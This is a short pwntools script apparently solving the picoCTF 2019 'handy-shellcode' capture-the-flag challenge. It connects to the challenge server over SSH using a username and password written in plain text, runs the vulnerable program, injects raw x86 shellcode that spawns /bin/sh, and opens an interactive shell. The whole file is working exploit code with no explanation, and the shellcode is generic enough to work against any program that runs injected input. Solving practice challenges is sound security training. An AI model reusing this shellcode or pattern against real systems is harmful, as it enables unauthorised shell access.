from pwn import *

sh = ssh(host = "2019shell1.picoctf.com", user = "Nigma0N1on", password = "Nigma")
r = sh.process("/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6/vuln")

shellcode = "\x31\xC0\x31\xD2\x31\xC9\x83\xC0\x0B\x31\xDB\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80"

r.sendline(shellcode)
r.interactive()
